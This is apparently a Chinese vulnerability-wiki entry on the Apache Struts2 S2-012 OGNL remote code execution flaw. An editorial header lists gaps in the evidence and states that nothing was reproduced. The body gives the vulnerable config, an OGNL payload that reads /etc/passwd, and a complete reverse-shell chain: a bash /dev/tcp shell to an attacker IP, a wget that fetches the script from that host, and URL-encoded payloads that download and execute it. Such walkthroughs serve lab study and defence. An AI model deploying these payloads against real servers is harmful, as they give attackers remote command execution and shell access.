---
source: "Threekiii/Vulnerability-Wiki"
title: "Apache Struts2 S2-012 远程代码执行漏洞"
product: "Apache Struts2重定向result"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "S2-012"
referenced_identifiers: ""
identifier_role: "primary"
prerequisites: "2.1.0–2.3.13，redirect result使用受控${name}且Action返回该result；无需文件上传功能"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-144e9af9004529f690be8ea0"
entity_id: "ve-144e9af9004529f690be8ea0"
schema_version: "1"
---

# Apache Struts2 S2-012 远程代码执行漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：2.1.0–2.3.13，redirect result使用受控${name}且Action返回该result；无需文件上传功能
- 证据范围：给出关键struts.xml，说明重定向参数二次求值；沿用001表达式不代表同根因同条目。

### 本次正文校订

- 按实际内容修正 3 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 普通表单称上传页面，模板残留
- 没有完整HTTP输入/Action返回逻辑，结果靠图
- 这里没有沙盒是过度简化，应区分绕过点和该版本安全限制
- 缺CVE/修复版本和取消不可信动态求值建议
- cwd/固定Tomcat路径及下载文件残留未交代

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：

```
<package name="S2-012" extends="struts-default">
    <action name="user" class="com.demo.action.UserAction">
        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>
        <result name="input">/index.jsp</result>
        <result name="success">/index.jsp</result>
    </action>
</package>
```

这里 UserAction 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行。

漏洞详情:

- http://struts.apache.org/docs/s2-012.html

## 漏洞影响

影响版本: 2.1.0 - 2.3.13

## 环境搭建

Vulhub 执行以下命令启动 s2-012 测试环境：

```shell
docker-compose build
docker-compose up -d
```

访问 `http://your-vps-ip:8080/index.jsp` 即可进入上传表单页面。

## 漏洞复现

可以直接祭出 s2-001 中的回显 POC，因为这里是没有沙盒，也没有限制任何特殊字符。

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat", "/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

发送请求，执行命令：

![image-20220301173613307](./.resource/Apache-Struts2-S2-012-远程代码执行漏洞/media/202203011736450.png)


### 反弹 shell

编写 shell 脚本并启动 http 服务器：

```
echo "bash -i >& /dev/tcp/192.168.174.128/9999 0>&1" > shell.sh
python3环境下：python -m http.server 80
```

上传 shell.sh 文件的命令为：

```shell
wget 192.168.174.128/shell.sh
```

上传 shell.sh 文件的 Payload 为：

```
%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22wget%22%2C+%22192.168.174.128%2Fshell.sh%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D
```

执行 shell.sh 文件的命令为：

```shell
bash /usr/local/tomcat/shell.sh
```

执行 shell.sh 文件的 Payload 为：

```
%25%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D%7B%22bash%22%2C+%22%2Fusr%2Flocal%2Ftomcat%2Fshell.sh%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new+java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%7D
```

成功接收反弹 shell：

![image-20220301173937416](./.resource/Apache-Struts2-S2-012-远程代码执行漏洞/media/202203011739511.png)


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
